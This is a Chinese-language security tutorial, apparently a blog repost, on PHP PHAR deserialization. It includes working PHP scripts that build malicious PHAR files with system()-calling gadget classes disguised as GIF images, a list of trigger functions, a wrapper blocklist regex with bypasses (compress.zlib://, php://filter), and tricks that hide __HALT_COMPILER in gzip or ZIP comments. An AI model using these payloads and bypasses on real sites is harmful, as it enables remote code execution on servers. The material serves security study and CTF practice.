---
title: "PHP反序列化——PHAR反序列化"
description: "phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、"
publishDate: "2025-09-22T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "phar"]
---
转载于

https://forum.butian.net/share/2678#(精研)

https://forum.butian.net/index.php/share/3007

https://www.freebuf.com/articles/web/291992.html

## Phar介绍

phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、

安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程

序分布在一个文件中并从该文件中运行的方法。

## phar文件结构

1、stub

一个供phar扩展用于识别的标志，格式为xxx\<?php xxx; \_\_HALT\_COMPILER();?>，前面内容不限，但必须以

\_\_HALT\_COMPILER();?>来结尾，否则phar扩展将无法识别这个文件为phar文件。

2、manifest

phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列

化的形式存储用户自定义的meta-data，而PHP在解析meta数据时，会调用`php_var_unserialize`进行反序列化操作。这里即为反序列化漏洞点。

3、contents

被压缩文件的内容。

4、signature

签名，放在文件末尾



`phar://pic/phar.phar.gz/phar.phar`

* 结构：`phar://[归档文件路径]/[归档内文件路径]`





## 常见的可以触发Phar反序列化的PHP文件系统函数如下

![1280X1280](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/3745a3073f592844f1954a29127ddb36.png)

但实际上只要调用了php\_stream\_open\_wrapper的函数，都存在这样的问题。因此还有以下函数：

```php

exif
exif_thumbnail
exif_imagetype

gd
imageloadfont
imagecreatefrom

hash
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file

file / url
get_meta_tags
get_headers
mime_content_type

standard
getimagesize
getimagesizefromstring

finfo
finfo_file
finfo_buffer

zip
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');

Postgres
<?php$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');

MySQL
LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
<?phpclass A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
再配置一下mysqld。（非默认配置）
[mysqld]
local-infile=1
secure_file_priv=""
```



* 文件系统函数 (最常见)：

  * `file_exists(‘phar://test.jpg’)`

  * `fopen(‘phar://test.jpg’, ‘r’)`

  * `file_get_contents(‘phar://test.jpg’)`

  * `unlink(‘phar://test.jpg’)` 等等。

  * 只要网站有任何功能（如头像查看、文件下载、附件预览）接受了用户可控的路径参数，并且传入了这类函数，就可能触发。

* 图像处理函数：非常常用的触发场景，因为攻击者常把 Phar 文件伪装成图片上传。

  * `exif_thumbnail('phar://test.jpg’)`

  * `exif_imagetype('phar://test.jpg’)`

  * `getimagesize('phar://test.jpg’)`

  * `imagecreatefromjpeg('phar://test.jpg’)`

  * 例如，一个网站上传头像后，可能会用 `getimagesize()` 来检查图片有效性，如果路径可控，就能触发。

* 哈希计算函数：

  * `md5_file(‘phar://test.jpg’)`

  * `sha1_file(‘phar://test.jpg’)`

  * 如果网站提供了计算文件哈希值的功能，就可能用到这些函数。

* 压缩包处理：

  ```php
  $zip = new ZipArchive();
  $res = $zip->open('c.zip');
  $zip->extractTo('phar://test.jpg/test'); // 提取目标指向 phar 路径
  ```

* 数据库操作 (高级利用)：

  * MySQL - `LOAD DATA LOCAL INFILE`：

  ```bash
  // 攻击者控制连接的 MySQL 用户需要具备 FILE 权限，且服务端配置需允许 LOAD DATA LOCAL
  $m = mysqli_init();
  mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true); // 必须开启
  $s = mysqli_real_connect($m, 'localhost', 'root', 'password', 'testdb', 3306);
  // 执行查询，让 MySQL 客户端去读取恶意 Phar 文件
  $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.jpg/test\' INTO TABLE a');
  ```

  Phar 文件必须存在于 \*\*Web 服务器\*\*（客户端）上，并且 PHP 有权限读取它。

  * **必需配置**：

    * **客户端 (**`mysqli`)\*\*: 必须通过 `mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);` 显式开启 `LOCAL` 功能。这是默认关闭的，为了安全。

    * **服务器 (**`mysqld`)\*\*: 必须在 `my.cnf` 配置文件中设置 `local-infile=1`。这也是默认关闭的。

    * **服务器 (**`mysqld`)\*\*: 通常还需要设置 `secure_file_priv=""`（空值），这个选项默认为 `NULL`（即禁止 `LOAD FILE` 操作），虽然它主要影响服务器端的 `LOAD DATA INFILE`（无 LOCAL），但有时也会影响 LOCAL 行为。

* PostgreSQL - `pg_copy_from()`：

  ```php
  $pdo = new PDO(...);
  @$pdo->pgsqlCopyFromFile('my_table', 'phar://test.phar/aa'); // 从 phar 文件拷贝数据到表
  ```

`pgsqlCopyFromFile()` 是 PDO\_PGSQL 驱动的一个方法，它用于将\*\*客户端机器上\*\*的一个文件的内容直接拷贝到数据库的指定表中。

***

**一个简单的攻击场景想象：**

一个网站有一个“从备份文件恢复数据”的功能，它允许用户上传一个 `.txt` 文件，然后后端用 `LOAD DATA LOCAL INFILE` 将这个文件的数据导入数据库。攻击者可以：

1. 生成一个恶意的 Phar 文件，重命名为 `backup.txt` 上传。

2. 在上传后的表单中，指定文件路径为 `phar://uploads/backup.txt`（假设文件保存在 `uploads/` 目录）。

3) 网站后端执行了 `LOAD DATA LOCAL INFILE ‘phar://uploads/backup.txt’ INTO TABLE ...`。

4) 攻击者的恶意代码在数据库操作之前就被执行了

***



## Phar反序列化漏洞利用



### 将phar伪造成其他格式的文件

伪装成gif图片格式

```php
<?phpclass A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$a = new A();
$a->a='ls';
@unlink("test.phar");
$phar = new Phar("test.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```





生成tar文件

```php
<?php
class Sink {
    function __wakeup() {
        system($this->cmd);
    }
}

// 创建恶意对象
$o = new Sink();
$o->cmd = "id";

// 创建.phar目录和元数据文件
mkdir(".phar");
file_put_contents(".phar/.metadata", serialize($o));
file_put_contents("./test.txt", "123");

// 创建phar存档
system("tar -czf test2.phar .phar/.metadata ./test.txt");

// 清理临时文件
system("rm -r .phar test.txt");

echo "恶意Phar文件已创建: test2.phar";
?>
```



Bzip

Zip

Gzip

……

### 绕过phar://头部关键字检测&#x20;

如果后端检测参数不能以 phar 开头

```php
if (preg_match("/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i",$filename)
{
    die();
}
```

绕过方法

```plain text
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///home/sx/test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
// 还可以使用伪协议的方法绕过
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```



### 绕过\_\_HALT\_COMPILER特征检测



**姿势1**

将 phar 文件使用 gzip 命令进行压缩，可以看到压缩之后的文件中就没有了`__HALT_COMPILER()`，将 phar.gz 后缀改为 png（png文件可以上传）



文件上传成功后，利用文件包含漏洞包含文件

```plain text
file_un.php?filename=phar://pic/phar.phar.gz/phar.phar
# file_un.php中包含__destruct并且可以被触发
```



**姿势2**

我们可以将phar的内容写进压缩包注释中，也同样能够反序列化成功，压缩为zip也会绕过该正则

一个ZIP文件由三部分组成，其大致结构如下：

```php
[本地文件头1 + 文件数据1 + 数据描述符1] 
[本地文件头2 + 文件数据2 + 数据描述符2]
...
[中央目录记录]
[归档结尾记录（End of Central Directory Record, EOCD）]
```

关键部分是 EOCD，它标志着ZIP文件的结束，并包含了定位中央目录所需的信息。EOCD的结构中有一个专门的字段用于存储归档注释。

`__HALT_COMPILER();` 这个危险字符串被深埋在了文件的最末尾——ZIP归档注释里。简单的基于正则表达式的扫描可能只会检查文件的前N个字节（例如检查文件头），或者不会递归地解析ZIP格式并检查其注释字段。因此，这种恶意负载很容易逃脱检测。



```php
$phar_file = serialize($exp); // 1. 序列化恶意对象
echo $phar_file;
$zip = new ZipArchive();
$res = $zip->open('1.zip', ZipArchive::CREATE); 
$zip->addFromString('crispr.txt', 'file content goes here'); // 2. 添加一个无害的文件
$zip->setArchiveComment($phar_file); // 3. 【关键】将序列化数据设为注释
$zip->close();
```



phpggc 生成 phar参考：[php phar 反序列化利用](https://dummykitty.github.io/posts/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/#phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E7%82%B9)



![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/3f7efb6fa4cbec7a32f678a644e6eb4f.png)

1. 上传压缩之后的包含 php 代码的 phar 文件。

2. 文件名中包含 .phar，比如 test.phar.gif，或者文件路径包含.phar

3. 触发文件包含：include /xxx/1.phar.gif

4. php 会先进行解压该 phar，解压后还原正常的 php 代码，再进行包含





https://mp.weixin.qq.com/s/AVXVkmZLAaVQeNp\_ib3DFQ

[当include邂逅phar——DeadsecCTF2025 baby-web](https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/)（精研）

https://c1oudfl0w0.github.io/blog/2025/08/17/LilCTF-2025/

@湾区杯 ez\_readfile



## Reference

https://forum.butian.net/index.php/share/3007

https://dummykitty.github.io/posts/php-phar-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/

